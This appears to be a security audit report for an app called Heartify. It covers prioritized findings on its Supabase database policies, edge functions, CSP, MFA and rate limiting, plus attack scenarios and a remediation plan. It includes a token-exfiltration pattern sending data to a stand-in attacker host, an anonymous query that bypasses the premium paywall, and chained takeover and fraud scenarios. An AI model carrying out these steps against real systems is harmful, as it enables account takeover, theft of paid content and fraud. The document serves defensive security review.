# Heartify Security Audit — 2026-07-11

Adversarial audit assuming Heartify becomes a top-10 global app and every actor (unauthenticated internet, authenticated user, moderator, admin, owner, ex-employee, insider, botnet) is hostile. Findings are prioritized by exploitability × blast radius, not by scanner severity.

Legend: **P0** = active exploit path, **P1** = privilege/data risk, **P2** = hardening gap, **P3** = defense-in-depth.

---

## 1. Executive summary

| Area | Verdict | Highest severity open |
|---|---|---|
| Authentication (Supabase Auth, MFA) | ⚠️ Mostly good, MFA optional for admins | P1 |
| Authorization (roles, `has_role`, `AdminRoute`) | ✅ Sound pattern, but scattered role checks | P2 |
| RLS coverage | ⚠️ 155 linter warnings, 1 known premium bypass | **P0** |
| Edge functions | ⚠️ Shared `authz`, mostly good; a few env asserts and secret gates weak | P1 |
| API abuse / rate limits | ❌ **No enforced rate limiting anywhere** | **P0** |
| Spam / bot | ❌ No CAPTCHA on signup, reports, suggestions, anon āmīn | **P0** |
| Session hijacking | ⚠️ CSP does not restrict `connect-src` tightly; `unsafe-eval` present | P1 |
| Privilege escalation | ⚠️ Owner promotion via edge function OK; missing MFA re-auth on grant | P1 |
| Secrets / logging | ⚠️ Some functions log raw provider responses | P2 |

---

## 2. Findings

### P0-1 — Premium reciter audio URLs exposed to free/anon users
- **Table**: `public.reciter_audio_sources`
- Policy `Public can view reciter audio sources` filters `is_active=true` only; **does not gate `is_premium=true`**.
- Impact: Any anon caller can `select base_url from reciter_audio_sources where is_premium=true` and stream premium audio directly, bypassing Heartify+ paywall entirely.
- Fix: rewrite SELECT policy to `is_active=true AND (is_premium=false OR public.has_active_entitlement(auth.uid()))`. Server should also sign URLs (short-lived) for premium tracks so a leaked row is still unusable.
- Source: `supabase_lov` scanner `reciter_audio_sources_premium_bypass`.

### P0-2 — No rate limiting on any user-facing endpoint
- Edge functions (`submit-report`, `redeem-referral`, `notify-favorites`, `dispatch-alert`, `search`, `feed`, `recommendations`, `client-bootstrap`, `youtube-proxy`, `gsc`, `admin-roles`, `verify-channel`, `delete-account`, `moderate-video`, `generate-daily-dose`, `plus-*`) accept unbounded requests.
- Concrete abuse:
  - Signup flood → auth cost, database bloat via profile trigger.
  - `dua_anon_ameens` insert is anonymous+fingerprinted → botnet inflates virality metrics and pollutes leaderboards.
  - `submit-report` → moderation queue DoS, staff exhaustion, targeted "review-bomb" of a channel.
  - `youtube-proxy` → free proxy for scraping YouTube from your egress IPs (billing + reputation).
  - `redeem-referral` → farm referral rewards.
  - `dispatch-alert` → SMS/email cost bomb if a compromised admin token reaches it.
- Fix (short term, no infra change): per-user + per-IP token buckets in `rate_limit_counters` (already exists!) enforced in `_shared/rateLimit.ts` for every mutating function. Long term: Cloudflare / edge WAF.

### P0-3 — No CAPTCHA / bot signal on high-abuse write endpoints
- `plus_waitlist`, `suggest content`, `video_reports`, `channel_candidates`, `dua_anon_ameens`, signup, referral redemption — all accept writes with only a valid JWT (or none).
- A single Playwright script produces unlimited plausibly-real rows.
- Fix: Turnstile/hCaptcha on unauth surfaces + `plus_waitlist`. Require reCAPTCHA v3 score ≥ 0.5 for anon āmīn and referral share endpoints. Add per-fingerprint velocity caps.

### P1-1 — CSP allows `unsafe-inline` + `unsafe-eval` in `script-src`
- `index.html` `Content-Security-Policy` includes `'unsafe-inline' 'unsafe-eval'` and `img-src https:` (any host).
- Consequence: any reflected/stored HTML → full XSS; a stolen access-token in localStorage can be posted anywhere the CSP allows connect-src (currently only Supabase, GCE, Lovable AI — good), but exfil via `<img src=https://attacker/?t=...>` is fully permitted.
- Fix: build with a strict nonce-based CSP (Vite supports it), remove `unsafe-eval` (Vite only needs it in dev), restrict `img-src` to a known CDN list, add `require-trusted-types-for 'script'`.

### P1-2 — 154 SECURITY DEFINER functions callable by `anon`/`authenticated`
- Supabase linter reports 47 anon-executable + 107 authenticated-executable `SECURITY DEFINER` functions.
- Any of those that read tables or perform writes with elevated rights is a lateral escalation channel (an anon user calling `public.<helper>()` runs as owner).
- Fix: for each function decide (a) needs to stay callable — keep, but explicitly `REVOKE EXECUTE ... FROM PUBLIC; GRANT EXECUTE ... TO authenticated;` and audit body for user-tainted params; (b) internal-only — `REVOKE EXECUTE FROM PUBLIC, anon, authenticated;` and call from edge functions using service role; (c) rewrite as `SECURITY INVOKER` where RLS is sufficient.
- Priority targets to inspect first: any function whose name starts with `admin_`, `promote_`, `set_`, `grant_`, `update_role`, `mark_`, `reset_`, `refund_`, `refresh_`, and the `has_role`/`has_active_entitlement` families (these must stay `DEFINER` but must have narrow signatures and no dynamic SQL).

### P1-3 — MFA not enforced for privileged actions
- `MfaEnroll.tsx` and `useRequireAdminMfa` exist, but role grants in `admin-roles` and entitlement grants in `AdminEntitlements` only check role, not fresh AAL2. A stolen admin session token → total takeover.
- Fix: require `aal=aal2` on all admin/moderator/owner mutating endpoints (`getClaims().aal === 'aal2'`), and refresh AAL every 15 min via `supabase.auth.mfa.challenge`. Deny if `aal !== 'aal2'`.

### P1-4 — Search-path mutable functions (SUPA_function_search_path_mutable)
- At least one non-DEFINER function lacks `SET search_path = public`. Combined with the SECURITY DEFINER cluster this is a classic search-path hijack precursor if any function is ever wrapped in `SECURITY DEFINER`.
- Fix: `ALTER FUNCTION ... SET search_path = public, pg_temp` for all functions.

### P1-5 — Two extensions installed in `public`
- Linter warns twice (likely `pgcrypto`, `pg_net`, `pg_cron`, or similar). Anyone with `USAGE` on `public` can call them; also complicates future dump/restore.
- Fix: move to a dedicated schema (`create schema extensions;` then `alter extension X set schema extensions;`).

### P1-6 — `youtube-proxy` open relay
- If it forwards arbitrary paths/params to `googleapis.com`, it lets attackers use your API quota, IP reputation, and Lovable credits.
- Fix: allow-list endpoints (`videos.list`, `search.list`, specific channel IDs), enforce max page size, cache by `(endpoint, hash(params))`, sign requests with a per-user HMAC to attribute abuse.

### P1-7 — `dispatch-alert` shape unknown but privileged
- If it sends email/SMS or calls webhooks, an authenticated user reaching it with role-check bypass could weaponize it. Ensure: (a) authorize on `has_role(owner)` only, (b) require AAL2, (c) allow-list destination domains, (d) per-minute cap.

### P1-8 — `admin-roles` promotion endpoint
- Verify it re-validates the caller's role via `has_role(auth.uid(),'owner')` **and** requires AAL2, and that it forbids self-promotion of the owner tier without another owner's co-sign. Otherwise: a compromised admin session can escalate itself.

### P2-1 — Session storage in localStorage (default Supabase)
- Any XSS = full account takeover (see P1-1). Consider `flowType=pkce` + cookie storage with `httpOnly` via `@supabase/ssr` when moving to SSR, or at minimum implement short session TTL + refresh rotation.

### P2-2 — `robots.txt` leaks admin URL structure
- Disallowing `/admin/`, `/owner`, `/security/` in `robots.txt` tells attackers exactly where to probe. Fix: remove the entries (routes are gated server-side anyway), or move admin to an unguessable path segment.

### P2-3 — `gsc-sync` shared-secret rotation is DB-backed but the fallback function `get_internal_config` is likely SECURITY DEFINER and callable by clients
- Confirm `REVOKE EXECUTE ON FUNCTION public.get_internal_config FROM PUBLIC, anon, authenticated;`. Otherwise any signed-in user can read `gsc_cron_secret`, replay to `/functions/v1/gsc-sync`, and trigger arbitrary GSC syncs / snapshot pollution.

### P2-4 — Sensitive data in edge-function logs
- `gsc` and `gsc-sync` log full provider response bodies on error and snapshot them into `gsc_sync_snapshots.data` — includes site URLs and search queries with performance data. Restrict SELECT on `gsc_sync_snapshots` to owner role (already 2 policies — verify they're not `to authenticated`).
- `dispatch-alert`, `notify-favorites` — audit for logging of tokens or user emails.

### P2-5 — CORS is `*` on every edge function
- Any origin can call them with a stolen JWT (JWT is bearer, so CORS doesn't stop token theft, but tightening to your domains removes drive-by CSRF via `fetch(...,{credentials:'include'})` for cookie-auth in the future, and reduces browser-side abuse patterns). Restrict `Access-Control-Allow-Origin` to `https://pure-heartify.lovable.app`, preview domain, and Capacitor scheme.

### P2-6 — Signup does not enforce HIBP
- Password leak-check off by default. Enable via `configure_auth({ password_hibp_enabled: true })`.

### P2-7 — Anonymous engagement primitives (`dua_anon_ameens`) can be replayed
- Browser fingerprinting is not an authenticator. Any attacker rotates fingerprint + IP → unlimited āmīns. This will 100% be exploited to game growth dashboards.
- Fix: attach a signed anonymous device attestation (Play Integrity / App Attest for mobile, Turnstile for web) and store its verdict alongside the row. Rate-limit by IP /24 and fingerprint.

### P2-8 — `.env` publish-time drift
- If workspace move stripped `VITE_SUPABASE_*` from `.env`, published site would break silently. Not a vuln but an availability risk during moves like the one you just did. Add a `main.tsx` boot check that hard-fails with a visible banner if these vars are undefined.

### P3-1 — HSTS / X-Frame-Options / COOP-COEP set at CDN, not verified
- Verify at the hosting layer (`strict-transport-security: max-age=63072000; includeSubDomains; preload`, `x-frame-options: DENY`, `cross-origin-opener-policy: same-origin`, `cross-origin-resource-policy: same-origin`).

### P3-2 — Storage buckets not audited in this pass
- Any bucket that is `public: true` and contains user-uploaded content is a pivot for stored-XSS via SVG. Audit all buckets, force `content-type` sniffing off, and serve user uploads from a separate `usercontent.` host.

### P3-3 — Dependency scanner shows 0 findings but bun.lockb is binary
- Convert to text lockfile (`bun install --save-text-lockfile`) so the supply-chain scanner runs each turn.

### P3-4 — GitHub Actions secret exposure
- Multiple workflows (`nightly-reaudit`, `retention-purge-*`, `playwright-e2e`) — verify none `echo`s secrets, none uses `pull_request_target` on forks, none allows the default `GITHUB_TOKEN` to write to protected branches.

---

## 3. Attack scenarios walk-through

1. **Growth-metrics poisoning (P0-2 + P2-7)** — attacker scripts 5M anonymous āmīns from a residential proxy pool. Leaderboards, weekly recap, "millions praying together" viral copy all become false. Trust destroyed publicly.
2. **Premium bypass at scale (P0-1)** — competitor scrapes `reciter_audio_sources`, republishes premium Qari catalog for free. Refund wave, App Store review risk, licensor breach.
3. **Moderation DoS (P0-2)** — a hostile actor reports every video from a rival channel 100k× in an hour. Human queue collapses, real reports are buried.
4. **Session hijack chain (P1-1 → P2-1)** — stored XSS via user-suggested channel description (if ever rendered as HTML) → exfil access_token via `<img src=https://…>` allowed by CSP → attacker uses token against `admin-roles` because MFA is not required (P1-3) → full owner.
5. **Referral fraud (P0-2 + P0-3)** — botnet farms redemption endpoint, drains reward budget.

---

## 4. Recommended remediation order

**Ship this week (P0 + top P1):**
1. Patch `reciter_audio_sources` SELECT policy + sign premium URLs.
2. Enforce `_shared/rateLimit.ts` on every mutating edge function.
3. Add Turnstile to anon āmīn, signup, plus_waitlist, submit-report, redeem-referral.
4. Require AAL2 for `admin-roles`, `AdminEntitlements` grant/revoke, `dispatch-alert`, `moderate-video` override.
5. Revoke `EXECUTE ... FROM PUBLIC, anon, authenticated` on every non-user-facing SECURITY DEFINER function; keep only the vetted `has_role`, `has_active_entitlement`, and similar helpers.

**Two-week hardening (P1 + P2):**
6. Rewrite CSP to nonce-based, drop `unsafe-eval` in prod.
7. `SET search_path` on all functions; move extensions out of `public`.
8. Restrict CORS to known origins.
9. Enable HIBP password check.
10. Allow-list + cache `youtube-proxy`.
11. Verify `get_internal_config` execute perms.
12. Remove admin paths from `robots.txt`.

**Structural (P3, next month):**
13. Move to cookie-based session (`@supabase/ssr`) with httpOnly + PKCE.
14. Add device attestation for mobile anon writes.
15. CDN-layer WAF + HSTS/COOP/COEP verification.
16. Convert `bun.lockb` → text for supply-chain scanning.
17. Audit every Storage bucket ACL and file MIME handling.

---

## 5. What is intentionally accepted

- Publishable Supabase anon key in the browser bundle (protected by RLS).
- Public-read on curated Islamic content (videos, tracks, dua text) — intentional; only premium rows must gate.
- CSP allowlists YouTube iframes — needed for playback.
